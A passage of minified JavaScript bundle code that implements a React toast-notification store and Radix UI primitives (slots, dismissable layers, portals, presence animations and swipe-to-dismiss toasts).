    Nv = (e, t) => {
        switch (t.type) {
            case "ADD_TOAST":
                return { ...e,
                    toasts: [t.toast, ...e.toasts].slice(0, Ev)
                };
            case "UPDATE_TOAST":
                return { ...e,
                    toasts: e.toasts.map(n => n.id === t.toast.id ? { ...n,
                        ...t.toast
                    } : n)
                };
            case "DISMISS_TOAST":
                {
                    const {
                        toastId: n
                    } = t;
                    return n ? Za(n) : e.toasts.forEach(r => {
                        Za(r.id)
                    }),
                    { ...e,
                        toasts: e.toasts.map(r => r.id === n || n === void 0 ? { ...r,
                            open: !1
                        } : r)
                    }
                }
            case "REMOVE_TOAST":
                return t.toastId === void 0 ? { ...e,
                    toasts: []
                } : { ...e,
                    toasts: e.toasts.filter(n => n.id !== t.toastId)
                }
        }
    },
    Bo = [];
let Qo = {
    toasts: []
};

function Ir(e) {
    Qo = Nv(Qo, e), Bo.forEach(t => {
        t(Qo)
    })
}

function Tv({ ...e
}) {
    const t = Pv(),
        n = o => Ir({
            type: "UPDATE_TOAST",
            toast: { ...o,
                id: t
            }
        }),
        r = () => Ir({
            type: "DISMISS_TOAST",
            toastId: t
        });
    return Ir({
        type: "ADD_TOAST",
        toast: { ...e,
            id: t,
            open: !0,
            onOpenChange: o => {
                o || r()
            }
        }
    }), {
        id: t,
        dismiss: r,
        update: n
    }
}

function _v() {
    const [e, t] = g.useState(Qo);
    return g.useEffect(() => (Bo.push(t), () => {
        const n = Bo.indexOf(t);
        n > -1 && Bo.splice(n, 1)
    }), [e]), { ...e,
        toast: Tv,
        dismiss: n => Ir({
            type: "DISMISS_TOAST",
            toastId: n
        })
    }
}

function Ie(e, t, {
    checkForDefaultPrevented: n = !0
} = {}) {
    return function(o) {
        if (e == null || e(o), n === !1 || !o.defaultPrevented) return t == null ? void 0 : t(o)
    }
}

function Ja(e, t) {
    if (typeof e == "function") return e(t);
    e != null && (e.current = t)
}

function Zf(...e) {
    return t => {
        let n = !1;
        const r = e.map(o => {
            const i = Ja(o, t);
            return !n && typeof i == "function" && (n = !0), i
        });
        if (n) return () => {
            for (let o = 0; o < r.length; o++) {
                const i = r[o];
                typeof i == "function" ? i() : Ja(e[o], null)
            }
        }
    }
}

function Sn(...e) {
    return g.useCallback(Zf(...e), e)
}

function Jf(e, t = []) {
    let n = [];

    function r(i, s) {
        const l = g.createContext(s),
            u = n.length;
        n = [...n, s];
        const a = m => {
            var d;
            const {
                scope: h,
                children: w,
                ...k
            } = m, v = ((d = h == null ? void 0 : h[e]) == null ? void 0 : d[u]) || l, S = g.useMemo(() => k, Object.values(k));
            return y.jsx(v.Provider, {
                value: S,
                children: w
            })
        };
        a.displayName = i + "Provider";

        function p(m, h) {
            var v;
            const w = ((v = h == null ? void 0 : h[e]) == null ? void 0 : v[u]) || l,
                k = g.useContext(w);
            if (k) return k;
            if (s !== void 0) return s;
            throw new Error(`\`${m}\` must be used within \`${i}\``)
        }
        return [a, p]
    }
    const o = () => {
        const i = n.map(s => g.createContext(s));
        return function(l) {
            const u = (l == null ? void 0 : l[e]) || i;
            return g.useMemo(() => ({
                [`__scope${e}`]: { ...l,
                    [e]: u
                }
            }), [l, u])
        }
    };
    return o.scopeName = e, [r, Rv(o, ...t)]
}

function Rv(...e) {
    const t = e[0];
    if (e.length === 1) return t;
    const n = () => {
        const r = e.map(o => ({
            useScope: o(),
            scopeName: o.scopeName
        }));
        return function(i) {
            const s = r.reduce((l, {
                useScope: u,
                scopeName: a
            }) => {
                const m = u(i)[`__scope${a}`];
                return { ...l,
                    ...m
                }
            }, {});
            return g.useMemo(() => ({
                [`__scope${t.scopeName}`]: s
            }), [s])
        }
    };
    return n.scopeName = t.scopeName, n
}

function vi(e) {
    const t = Ov(e),
        n = g.forwardRef((r, o) => {
            const {
                children: i,
                ...s
            } = r, l = g.Children.toArray(i), u = l.find(Mv);
            if (u) {
                const a = u.props.children,
                    p = l.map(m => m === u ? g.Children.count(a) > 1 ? g.Children.only(null) : g.isValidElement(a) ? a.props.children : null : m);
                return y.jsx(t, { ...s,
                    ref: o,
                    children: g.isValidElement(a) ? g.cloneElement(a, void 0, p) : null
                })
            }
            return y.jsx(t, { ...s,
                ref: o,
                children: i
            })
        });
    return n.displayName = `${e}.Slot`, n
}
var jv = vi("Slot");

function Ov(e) {
    const t = g.forwardRef((n, r) => {
        const {
            children: o,
            ...i
        } = n;
        if (g.isValidElement(o)) {
            const s = Dv(o),
                l = Iv(i, o.props);
            return o.type !== g.Fragment && (l.ref = r ? Zf(r, s) : s), g.cloneElement(o, l)
        }
        return g.Children.count(o) > 1 ? g.Children.only(null) : null
    });
    return t.displayName = `${e}.SlotClone`, t
}
var Lv = Symbol("radix.slottable");

function Mv(e) {
    return g.isValidElement(e) && typeof e.type == "function" && "__radixId" in e.type && e.type.__radixId === Lv
}

function Iv(e, t) {
    const n = { ...t
    };
    for (const r in t) {
        const o = e[r],
            i = t[r];
        /^on[A-Z]/.test(r) ? o && i ? n[r] = (...l) => {
            i(...l), o(...l)
        } : o && (n[r] = o) : r === "style" ? n[r] = { ...o,
            ...i
        } : r === "className" && (n[r] = [o, i].filter(Boolean).join(" "))
    }
    return { ...e,
        ...n
    }
}

function Dv(e) {
    var r, o;
    let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get,
        n = t && "isReactWarning" in t && t.isReactWarning;
    return n ? e.ref : (t = (o = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : o.get, n = t && "isReactWarning" in t && t.isReactWarning, n ? e.props.ref : e.props.ref || e.ref)
}

function Fv(e) {
    const t = e + "CollectionProvider",
        [n, r] = Jf(t),
        [o, i] = n(t, {
            collectionRef: {
                current: null
            },
            itemMap: new Map
        }),
        s = v => {
            const {
                scope: S,
                children: d
            } = v, c = Ot.useRef(null), f = Ot.useRef(new Map).current;
            return y.jsx(o, {
                scope: S,
                itemMap: f,
                collectionRef: c,
                children: d
            })
        };
    s.displayName = t;
    const l = e + "CollectionSlot",
        u = vi(l),
        a = Ot.forwardRef((v, S) => {
            const {
                scope: d,
                children: c
            } = v, f = i(l, d), x = Sn(S, f.collectionRef);
            return y.jsx(u, {
                ref: x,
                children: c
            })
        });
    a.displayName = l;
    const p = e + "CollectionItemSlot",
        m = "data-radix-collection-item",
        h = vi(p),
        w = Ot.forwardRef((v, S) => {
            const {
                scope: d,
                children: c,
                ...f
            } = v, x = Ot.useRef(null), C = Sn(S, x), P = i(p, d);
            return Ot.useEffect(() => (P.itemMap.set(x, {
                ref: x,
                ...f
            }), () => void P.itemMap.delete(x))), y.jsx(h, {
                [m]: "",
                ref: C,
                children: c
            })
        });
    w.displayName = p;

    function k(v) {
        const S = i(e + "CollectionConsumer", v);
        return Ot.useCallback(() => {
            const c = S.collectionRef.current;
            if (!c) return [];
            const f = Array.from(c.querySelectorAll(`[${m}]`));
            return Array.from(S.itemMap.values()).sort((P, N) => f.indexOf(P.ref.current) - f.indexOf(N.ref.current))
        }, [S.collectionRef, S.itemMap])
    }
    return [{
        Provider: s,
        Slot: a,
        ItemSlot: w
    }, k, r]
}
var Av = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "span", "svg", "ul"],
    rt = Av.reduce((e, t) => {
        const n = vi(`Primitive.${t}`),
            r = g.forwardRef((o, i) => {
                const {
                    asChild: s,
                    ...l
                } = o, u = s ? n : t;
                return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0), y.jsx(u, { ...l,
                    ref: i
                })
            });
        return r.displayName = `Primitive.${t}`, { ...e,
            [t]: r
        }
    }, {});

function ep(e, t) {
    e && Ai.flushSync(() => e.dispatchEvent(t))
}

function Pt(e) {
    const t = g.useRef(e);
    return g.useEffect(() => {
        t.current = e
    }), g.useMemo(() => (...n) => {
        var r;
        return (r = t.current) == null ? void 0 : r.call(t, ...n)
    }, [])
}

function zv(e, t = globalThis == null ? void 0 : globalThis.document) {
    const n = Pt(e);
    g.useEffect(() => {
        const r = o => {
            o.key === "Escape" && n(o)
        };
        return t.addEventListener("keydown", r, {
            capture: !0
        }), () => t.removeEventListener("keydown", r, {
            capture: !0
        })
    }, [n, t])
}
var bv = "DismissableLayer",
    xl = "dismissableLayer.update",
    Uv = "dismissableLayer.pointerDownOutside",
    $v = "dismissableLayer.focusOutside",
    ec, tp = g.createContext({
        layers: new Set,
        layersWithOutsidePointerEventsDisabled: new Set,
        branches: new Set
    }),
    np = g.forwardRef((e, t) => {
        const {
            disableOutsidePointerEvents: n = !1,
            onEscapeKeyDown: r,
            onPointerDownOutside: o,
            onFocusOutside: i,
            onInteractOutside: s,
            onDismiss: l,
            ...u
        } = e, a = g.useContext(tp), [p, m] = g.useState(null), h = (p == null ? void 0 : p.ownerDocument) ? ? (globalThis == null ? void 0 : globalThis.document), [, w] = g.useState({}), k = Sn(t, N => m(N)), v = Array.from(a.layers), [S] = [...a.layersWithOutsidePointerEventsDisabled].slice(-1), d = v.indexOf(S), c = p ? v.indexOf(p) : -1, f = a.layersWithOutsidePointerEventsDisabled.size > 0, x = c >= d, C = Wv(N => {
            const _ = N.target,
                M = [...a.branches].some(L => L.contains(_));
            !x || M || (o == null || o(N), s == null || s(N), N.defaultPrevented || l == null || l())
        }, h), P = Bv(N => {
            const _ = N.target;
            [...a.branches].some(L => L.contains(_)) || (i == null || i(N), s == null || s(N), N.defaultPrevented || l == null || l())
        }, h);
        return zv(N => {
            c === a.layers.size - 1 && (r == null || r(N), !N.defaultPrevented && l && (N.preventDefault(), l()))
        }, h), g.useEffect(() => {
            if (p) return n && (a.layersWithOutsidePointerEventsDisabled.size === 0 && (ec = h.body.style.pointerEvents, h.body.style.pointerEvents = "none"), a.layersWithOutsidePointerEventsDisabled.add(p)), a.layers.add(p), tc(), () => {
                n && a.layersWithOutsidePointerEventsDisabled.size === 1 && (h.body.style.pointerEvents = ec)
            }
        }, [p, h, n, a]), g.useEffect(() => () => {
            p && (a.layers.delete(p), a.layersWithOutsidePointerEventsDisabled.delete(p), tc())
        }, [p, a]), g.useEffect(() => {
            const N = () => w({});
            return document.addEventListener(xl, N), () => document.removeEventListener(xl, N)
        }, []), y.jsx(rt.div, { ...u,
            ref: k,
            style: {
                pointerEvents: f ? x ? "auto" : "none" : void 0,
                ...e.style
            },
            onFocusCapture: Ie(e.onFocusCapture, P.onFocusCapture),
            onBlurCapture: Ie(e.onBlurCapture, P.onBlurCapture),
            onPointerDownCapture: Ie(e.onPointerDownCapture, C.onPointerDownCapture)
        })
    });
np.displayName = bv;
var Vv = "DismissableLayerBranch",
    rp = g.forwardRef((e, t) => {
        const n = g.useContext(tp),
            r = g.useRef(null),
            o = Sn(t, r);
        return g.useEffect(() => {
            const i = r.current;
            if (i) return n.branches.add(i), () => {
                n.branches.delete(i)
            }
        }, [n.branches]), y.jsx(rt.div, { ...e,
            ref: o
        })
    });
rp.displayName = Vv;

function Wv(e, t = globalThis == null ? void 0 : globalThis.document) {
    const n = Pt(e),
        r = g.useRef(!1),
        o = g.useRef(() => {});
    return g.useEffect(() => {
        const i = l => {
                if (l.target && !r.current) {
                    let u = function() {
                        op(Uv, n, a, {
                            discrete: !0
                        })
                    };
                    const a = {
                        originalEvent: l
                    };
                    l.pointerType === "touch" ? (t.removeEventListener("click", o.current), o.current = u, t.addEventListener("click", o.current, {
                        once: !0
                    })) : u()
                } else t.removeEventListener("click", o.current);
                r.current = !1
            },
            s = window.setTimeout(() => {
                t.addEventListener("pointerdown", i)
            }, 0);
        return () => {
            window.clearTimeout(s), t.removeEventListener("pointerdown", i), t.removeEventListener("click", o.current)
        }
    }, [t, n]), {
        onPointerDownCapture: () => r.current = !0
    }
}

function Bv(e, t = globalThis == null ? void 0 : globalThis.document) {
    const n = Pt(e),
        r = g.useRef(!1);
    return g.useEffect(() => {
        const o = i => {
            i.target && !r.current && op($v, n, {
                originalEvent: i
            }, {
                discrete: !1
            })
        };
        return t.addEventListener("focusin", o), () => t.removeEventListener("focusin", o)
    }, [t, n]), {
        onFocusCapture: () => r.current = !0,
        onBlurCapture: () => r.current = !1
    }
}

function tc() {
    const e = new CustomEvent(xl);
    document.dispatchEvent(e)
}

function op(e, t, n, {
    discrete: r
}) {
    const o = n.originalEvent.target,
        i = new CustomEvent(e, {
            bubbles: !1,
            cancelable: !0,
            detail: n
        });
    t && o.addEventListener(e, t, {
        once: !0
    }), r ? ep(o, i) : o.dispatchEvent(i)
}
var Qv = np,
    Hv = rp,
    gi = globalThis != null && globalThis.document ? g.useLayoutEffect : () => {},
    Kv = "Portal",
    ip = g.forwardRef((e, t) => {
        var l;
        const {
            container: n,
            ...r
        } = e, [o, i] = g.useState(!1);
        gi(() => i(!0), []);
        const s = n || o && ((l = globalThis == null ? void 0 : globalThis.document) == null ? void 0 : l.body);
        return s ? Sy.createPortal(y.jsx(rt.div, { ...r,
            ref: t
        }), s) : null
    });
ip.displayName = Kv;

function Gv(e, t) {
    return g.useReducer((n, r) => t[n][r] ? ? n, e)
}
var sp = e => {
    const {
        present: t,
        children: n
    } = e, r = qv(t), o = typeof n == "function" ? n({
        present: r.isPresent
    }) : g.Children.only(n), i = Sn(r.ref, Yv(o));
    return typeof n == "function" || r.isPresent ? g.cloneElement(o, {
        ref: i
    }) : null
};
sp.displayName = "Presence";

function qv(e) {
    const [t, n] = g.useState(), r = g.useRef({}), o = g.useRef(e), i = g.useRef("none"), s = e ? "mounted" : "unmounted", [l, u] = Gv(s, {
        mounted: {
            UNMOUNT: "unmounted",
            ANIMATION_OUT: "unmountSuspended"
        },
        unmountSuspended: {
            MOUNT: "mounted",
            ANIMATION_END: "unmounted"
        },
        unmounted: {
            MOUNT: "mounted"
        }
    });
    return g.useEffect(() => {
        const a = jo(r.current);
        i.current = l === "mounted" ? a : "none"
    }, [l]), gi(() => {
        const a = r.current,
            p = o.current;
        if (p !== e) {
            const h = i.current,
                w = jo(a);
            e ? u("MOUNT") : w === "none" || (a == null ? void 0 : a.display) === "none" ? u("UNMOUNT") : u(p && h !== w ? "ANIMATION_OUT" : "UNMOUNT"), o.current = e
        }
    }, [e, u]), gi(() => {
        if (t) {
            let a;
            const p = t.ownerDocument.defaultView ? ? window,
                m = w => {
                    const v = jo(r.current).includes(w.animationName);
                    if (w.target === t && v && (u("ANIMATION_END"), !o.current)) {
                        const S = t.style.animationFillMode;
                        t.style.animationFillMode = "forwards", a = p.setTimeout(() => {
                            t.style.animationFillMode === "forwards" && (t.style.animationFillMode = S)
                        })
                    }
                },
                h = w => {
                    w.target === t && (i.current = jo(r.current))
                };
            return t.addEventListener("animationstart", h), t.addEventListener("animationcancel", m), t.addEventListener("animationend", m), () => {
                p.clearTimeout(a), t.removeEventListener("animationstart", h), t.removeEventListener("animationcancel", m), t.removeEventListener("animationend", m)
            }
        } else u("ANIMATION_END")
    }, [t, u]), {
        isPresent: ["mounted", "unmountSuspended"].includes(l),
        ref: g.useCallback(a => {
            a && (r.current = getComputedStyle(a)), n(a)
        }, [])
    }
}

function jo(e) {
    return (e == null ? void 0 : e.animationName) || "none"
}

function Yv(e) {
    var r, o;
    let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get,
        n = t && "isReactWarning" in t && t.isReactWarning;
    return n ? e.ref : (t = (o = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : o.get, n = t && "isReactWarning" in t && t.isReactWarning, n ? e.props.ref : e.props.ref || e.ref)
}

function Xv({
    prop: e,
    defaultProp: t,
    onChange: n = () => {}
}) {
    const [r, o] = Zv({
        defaultProp: t,
        onChange: n
    }), i = e !== void 0, s = i ? e : r, l = Pt(n), u = g.useCallback(a => {
        if (i) {
            const m = typeof a == "function" ? a(e) : a;
            m !== e && l(m)
        } else o(a)
    }, [i, e, o, l]);
    return [s, u]
}

function Zv({
    defaultProp: e,
    onChange: t
}) {
    const n = g.useState(e),
        [r] = n,
        o = g.useRef(r),
        i = Pt(t);
    return g.useEffect(() => {
        o.current !== r && (i(r), o.current = r)
    }, [r, o, i]), n
}
var Jv = "VisuallyHidden",
    Cu = g.forwardRef((e, t) => y.jsx(rt.span, { ...e,
        ref: t,
        style: {
            position: "absolute",
            border: 0,
            width: 1,
            height: 1,
            padding: 0,
            margin: -1,
            overflow: "hidden",
            clip: "rect(0, 0, 0, 0)",
            whiteSpace: "nowrap",
            wordWrap: "normal",
            ...e.style
        }
    }));
Cu.displayName = Jv;
var Pu = "ToastProvider",
    [Nu, eg, tg] = Fv("Toast"),
    [lp, v0] = Jf("Toast", [tg]),
    [ng, $i] = lp(Pu),
    up = e => {
        const {
            __scopeToast: t,
            label: n = "Notification",
            duration: r = 5e3,
            swipeDirection: o = "right",
            swipeThreshold: i = 50,
            children: s
        } = e, [l, u] = g.useState(null), [a, p] = g.useState(0), m = g.useRef(!1), h = g.useRef(!1);
        return n.trim() || console.error(`Invalid prop \`label\` supplied to \`${Pu}\`. Expected non-empty \`string\`.`), y.jsx(Nu.Provider, {
            scope: t,
            children: y.jsx(ng, {
                scope: t,
                label: n,
                duration: r,
                swipeDirection: o,
                swipeThreshold: i,
                toastCount: a,
                viewport: l,
                onViewportChange: u,
                onToastAdd: g.useCallback(() => p(w => w + 1), []),
                onToastRemove: g.useCallback(() => p(w => w - 1), []),
                isFocusedToastEscapeKeyDownRef: m,
                isClosePausedRef: h,
                children: s
            })
        })
    };
up.displayName = Pu;
var ap = "ToastViewport",
    rg = ["F8"],
    Sl = "toast.viewportPause",
    kl = "toast.viewportResume",
    cp = g.forwardRef((e, t) => {
        const {
            __scopeToast: n,
            hotkey: r = rg,
            label: o = "Notifications ({hotkey})",
            ...i
        } = e, s = $i(ap, n), l = eg(n), u = g.useRef(null), a = g.useRef(null), p = g.useRef(null), m = g.useRef(null), h = Sn(t, m, s.onViewportChange), w = r.join("+").replace(/Key/g, "").replace(/Digit/g, ""), k = s.toastCount > 0;
        g.useEffect(() => {
            const S = d => {
                var f;
                r.length !== 0 && r.every(x => d[x] || d.code === x) && ((f = m.current) == null || f.focus())
            };
            return document.addEventListener("keydown", S), () => document.removeEventListener("keydown", S)
        }, [r]), g.useEffect(() => {
            const S = u.current,
                d = m.current;
            if (k && S && d) {
                const c = () => {
                        if (!s.isClosePausedRef.current) {
                            const P = new CustomEvent(Sl);
                            d.dispatchEvent(P), s.isClosePausedRef.current = !0
                        }
                    },
                    f = () => {
                        if (s.isClosePausedRef.current) {
                            const P = new CustomEvent(kl);
                            d.dispatchEvent(P), s.isClosePausedRef.current = !1
                        }
                    },
                    x = P => {
                        !S.contains(P.relatedTarget) && f()
                    },
                    C = () => {
                        S.contains(document.activeElement) || f()
                    };
                return S.addEventListener("focusin", c), S.addEventListener("focusout", x), S.addEventListener("pointermove", c), S.addEventListener("pointerleave", C), window.addEventListener("blur", c), window.addEventListener("focus", f), () => {
                    S.removeEventListener("focusin", c), S.removeEventListener("focusout", x), S.removeEventListener("pointermove", c), S.removeEventListener("pointerleave", C), window.removeEventListener("blur", c), window.removeEventListener("focus", f)
                }
            }
        }, [k, s.isClosePausedRef]);
        const v = g.useCallback(({
            tabbingDirection: S
        }) => {
            const c = l().map(f => {
                const x = f.ref.current,
                    C = [x, ...yg(x)];
                return S === "forwards" ? C : C.reverse()
            });
            return (S === "forwards" ? c.reverse() : c).flat()
        }, [l]);
        return g.useEffect(() => {
            const S = m.current;
            if (S) {
                const d = c => {
                    var C, P, N;
                    const f = c.altKey || c.ctrlKey || c.metaKey;
                    if (c.key === "Tab" && !f) {
                        const _ = document.activeElement,
                            M = c.shiftKey;
                        if (c.target === S && M) {
                            (C = a.current) == null || C.focus();
                            return
                        }
                        const z = v({
                                tabbingDirection: M ? "backwards" : "forwards"
                            }),
                            Oe = z.findIndex(I => I === _);
                        Es(z.slice(Oe + 1)) ? c.preventDefault() : M ? (P = a.current) == null || P.focus() : (N = p.current) == null || N.focus()
                    }
                };
                return S.addEventListener("keydown", d), () => S.removeEventListener("keydown", d)
            }
        }, [l, v]), y.jsxs(Hv, {
            ref: u,
            role: "region",
            "aria-label": o.replace("{hotkey}", w),
            tabIndex: -1,
            style: {
                pointerEvents: k ? void 0 : "none"
            },
            children: [k && y.jsx(El, {
                ref: a,
                onFocusFromOutsideViewport: () => {
                    const S = v({
                        tabbingDirection: "forwards"
                    });
                    Es(S)
                }
            }), y.jsx(Nu.Slot, {
                scope: n,
                children: y.jsx(rt.ol, {
                    tabIndex: -1,
                    ...i,
                    ref: h
                })
            }), k && y.jsx(El, {
                ref: p,
                onFocusFromOutsideViewport: () => {
                    const S = v({
                        tabbingDirection: "backwards"
                    });
                    Es(S)
                }
            })]
        })
    });
cp.displayName = ap;
var dp = "ToastFocusProxy",
    El = g.forwardRef((e, t) => {
        const {
            __scopeToast: n,
            onFocusFromOutsideViewport: r,
            ...o
        } = e, i = $i(dp, n);
        return y.jsx(Cu, {
            "aria-hidden": !0,
            tabIndex: 0,
            ...o,
            ref: t,
            style: {
                position: "fixed"
            },
            onFocus: s => {
                var a;
                const l = s.relatedTarget;
                !((a = i.viewport) != null && a.contains(l)) && r()
            }
        })
    });
El.displayName = dp;
var Vi = "Toast",
    og = "toast.swipeStart",
    ig = "toast.swipeMove",
    sg = "toast.swipeCancel",
    lg = "toast.swipeEnd",
    fp = g.forwardRef((e, t) => {
        const {
            forceMount: n,
            open: r,
            defaultOpen: o,
            onOpenChange: i,
            ...s
        } = e, [l = !0, u] = Xv({
            prop: r,
            defaultProp: o,
            onChange: i
        });
        return y.jsx(sp, {
            present: n || l,
            children: y.jsx(cg, {
                open: l,
                ...s,
                ref: t,
                onClose: () => u(!1),
                onPause: Pt(e.onPause),
                onResume: Pt(e.onResume),
                onSwipeStart: Ie(e.onSwipeStart, a => {
                    a.currentTarget.setAttribute("data-swipe", "start")
                }),
                onSwipeMove: Ie(e.onSwipeMove, a => {
                    const {
                        x: p,
                        y: m
                    } = a.detail.delta;
                    a.currentTarget.setAttribute("data-swipe", "move"), a.currentTarget.style.setProperty("--radix-toast-swipe-move-x", `${p}px`), a.currentTarget.style.setProperty("--radix-toast-swipe-move-y", `${m}px`)
                }),
                onSwipeCancel: Ie(e.onSwipeCancel, a => {
                    a.currentTarget.setAttribute("data-swipe", "cancel"), a.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"), a.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"), a.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"), a.currentTarget.style.removeProperty("--radix-toast-swipe-end-y")
                }),
                onSwipeEnd: Ie(e.onSwipeEnd, a => {
                    const {
                        x: p,
                        y: m
                    } = a.detail.delta;
                    a.currentTarget.setAttribute("data-swipe", "end"), a.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"), a.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"), a.currentTarget.style.setProperty("--radix-toast-swipe-end-x", `${p}px`), a.currentTarget.style.setProperty("--radix-toast-swipe-end-y", `${m}px`), u(!1)
                })
            })
        })
    });
fp.displayName = Vi;
var [ug, ag] = lp(Vi, {
    onClose() {}
}), cg = g.forwardRef((e, t) => {
    const {
        __scopeToast: n,
        type: r = "foreground",
        duration: o,
        open: i,
        onClose: s,
        onEscapeKeyDown: l,
        onPause: u,
        onResume: a,
        onSwipeStart: p,
        onSwipeMove: m,
        onSwipeCancel: h,
        onSwipeEnd: w,
        ...k
    } = e, v = $i(Vi, n), [S, d] = g.useState(null), c = Sn(t, I => d(I)), f = g.useRef(null), x = g.useRef(null), C = o || v.duration, P = g.useRef(0), N = g.useRef(C), _ = g.useRef(0), {
        onToastAdd: M,
        onToastRemove: L
    } = v, Z = Pt(() => {
        var ue;
        (S == null ? void 0 : S.contains(document.activeElement)) && ((ue = v.viewport) == null || ue.focus()), s()
    }), z = g.useCallback(I => {
        !I || I === 1 / 0 || (window.clearTimeout(_.current), P.current = new Date().getTime(), _.current = window.setTimeout(Z, I))
    }, [Z]);
    g.useEffect(() => {
        const I = v.viewport;
        if (I) {
            const ue = () => {
                    z(N.current), a == null || a()
                },
                ae = () => {
                    const Ue = new Date().getTime() - P.current;
                    N.current = N.current - Ue, window.clearTimeout(_.current), u == null || u()
                };
            return I.addEventListener(Sl, ae), I.addEventListener(kl, ue), () => {
                I.removeEventListener(Sl, ae), I.removeEventListener(kl, ue)
            }
        }
    }, [v.viewport, C, u, a, z]), g.useEffect(() => {
        i && !v.isClosePausedRef.current && z(C)
    }, [i, C, v.isClosePausedRef, z]), g.useEffect(() => (M(), () => L()), [M, L]);
    const Oe = g.useMemo(() => S ? wp(S) : null, [S]);
    return v.viewport ? y.jsxs(y.Fragment, {
        children: [Oe && y.jsx(dg, {
            __scopeToast: n,
            role: "status",
            "aria-live": r === "foreground" ? "assertive" : "polite",
            "aria-atomic": !0,
            children: Oe
        }), y.jsx(ug, {
            scope: n,
            onClose: Z,
            children: Ai.createPortal(y.jsx(Nu.ItemSlot, {
                scope: n,
                children: y.jsx(Qv, {
                    asChild: !0,
                    onEscapeKeyDown: Ie(l, () => {
                        v.isFocusedToastEscapeKeyDownRef.current || Z(), v.isFocusedToastEscapeKeyDownRef.current = !1
                    }),
                    children: y.jsx(rt.li, {
                        role: "status",
                        "aria-live": "off",
                        "aria-atomic": !0,
                        tabIndex: 0,
                        "data-state": i ? "open" : "closed",
                        "data-swipe-direction": v.swipeDirection,
                        ...k,
                        ref: c,
                        style: {
                            userSelect: "none",
                            touchAction: "none",
                            ...e.style
                        },
                        onKeyDown: Ie(e.onKeyDown, I => {
                            I.key === "Escape" && (l == null || l(I.nativeEvent), I.nativeEvent.defaultPrevented || (v.isFocusedToastEscapeKeyDownRef.current = !0, Z()))
                        }),
                        onPointerDown: Ie(e.onPointerDown, I => {
                            I.button === 0 && (f.current = {
                                x: I.clientX,
                                y: I.clientY
                            })
                        }),
                        onPointerMove: Ie(e.onPointerMove, I => {
                            if (!f.current) return;
                            const ue = I.clientX - f.current.x,
                                ae = I.clientY - f.current.y,
                                Ue = !!x.current,
                                R = ["left", "right"].includes(v.swipeDirection),
                                O = ["left", "up"].includes(v.swipeDirection) ? Math.min : Math.max,
                                D = R ? O(0, ue) : 0,
                                U = R ? 0 : O(0, ae),
                                J = I.pointerType === "touch" ? 10 : 2,
                                pt = {
                                    x: D,
                                    y: U
                                },
                                ot = {
                                    originalEvent: I,
                                    delta: pt
                                };
                            Ue ? (x.current = pt, Oo(ig, m, ot, {
                                discrete: !1
                            })) : nc(pt, v.swipeDirection, J) ? (x.current = pt, Oo(og, p, ot, {
                                discrete: !1
                            }), I.target.setPointerCapture(I.pointerId)) : (Math.abs(ue) > J || Math.abs(ae) > J) && (f.current = null)
                        }),
                        onPointerUp: Ie(e.onPointerUp, I => {
                            const ue = x.current,
                                ae = I.target;
                            if (ae.hasPointerCapture(I.pointerId) && ae.releasePointerCapture(I.pointerId), x.current = null, f.current = null, ue) {
                                const Ue = I.currentTarget,
                                    R = {
                                        originalEvent: I,
                                        delta: ue
                                    };
                                nc(ue, v.swipeDirection, v.swipeThreshold) ? Oo(lg, w, R, {
                                    discrete: !0
                                }) : Oo(sg, h, R, {
                                    discrete: !0
                                }), Ue.addEventListener("click", O => O.preventDefault(), {
                                    once: !0
                                })
                            }
                        })
                    })
                })
            }), v.viewport)
        })]
    }) : null
}), dg = e => {
    const {
        __scopeToast: t,
        children: n,
        ...r
    } = e, o = $i(Vi, t), [i, s] = g.useState(!1), [l, u] = g.useState(!1);
    return hg(() => s(!0)), g.useEffect(() => {
        const a = window.setTimeout(() => u(!0), 1e3);
        return () => window.clearTimeout(a)
    }, []), l ? null : y.jsx(ip, {
        asChild: !0,
        children: y.jsx(Cu, { ...r,
            children: i && y.jsxs(y.Fragment, {
                children: [o.label, " ", n]
            })
        })
    })
}, fg = "ToastTitle", pp = g.forwardRef((e, t) => {
    const {
        __scopeToast: n,
        ...r
    } = e;
    return y.jsx(rt.div, { ...r,
        ref: t
    })
});
pp.displayName = fg;
var pg = "ToastDescription",
    hp = g.forwardRef((e, t) => {
        const {
            __scopeToast: n,
            ...r
        } = e;
        return y.jsx(rt.div, { ...r,
            ref: t
        })
    });
hp.displayName = pg;
var mp = "ToastAction",
    yp = g.forwardRef((e, t) => {
        const {
            altText: n,
            ...r
        } = e;
        return n.trim() ? y.jsx(gp, {
            altText: n,
            asChild: !0,
            children: y.jsx(Tu, { ...r,
                ref: t
            })
        }) : (console.error(`Invalid prop \`altText\` supplied to \`${mp}\`. Expected non-empty \`string\`.`), null)
    });
yp.displayName = mp;
var vp = "ToastClose",
    Tu = g.forwardRef((e, t) => {
        const {
            __scopeToast: n,
            ...r
        } = e, o = ag(vp, n);
        return y.jsx(gp, {
            asChild: !0,
            children: y.jsx(rt.button, {
                type: "button",
                ...r,
                ref: t,
                onClick: Ie(e.onClick, o.onClose)
            })
        })
    });
Tu.displayName = vp;
var gp = g.forwardRef((e, t) => {
    const {
        __scopeToast: n,
        altText: r,
        ...o
    } = e;
    return y.jsx(rt.div, {
        "data-radix-toast-announce-exclude": "",
        "data-radix-toast-announce-alt": r || void 0,
        ...o,
        ref: t
    })
});

function wp(e) {
    const t = [];
    return Array.from(e.childNodes).forEach(r => {
        if (r.nodeType === r.TEXT_NODE && r.textContent && t.push(r.textContent), mg(r)) {
            const o = r.ariaHidden || r.hidden || r.style.display === "none",
                i = r.dataset.radixToastAnnounceExclude === "";
            if (!o)
                if (i) {
                    const s = r.dataset.radixToastAnnounceAlt;
                    s && t.push(s)
                } else t.push(...wp(r))
        }
    }), t
}

function Oo(e, t, n, {
    discrete: r
}) {
    const o = n.originalEvent.currentTarget,
        i = new CustomEvent(e, {
            bubbles: !0,
            cancelable: !0,
            detail: n
        });
    t && o.addEventListener(e, t, {
        once: !0
    }), r ? ep(o, i) : o.dispatchEvent(i)
}
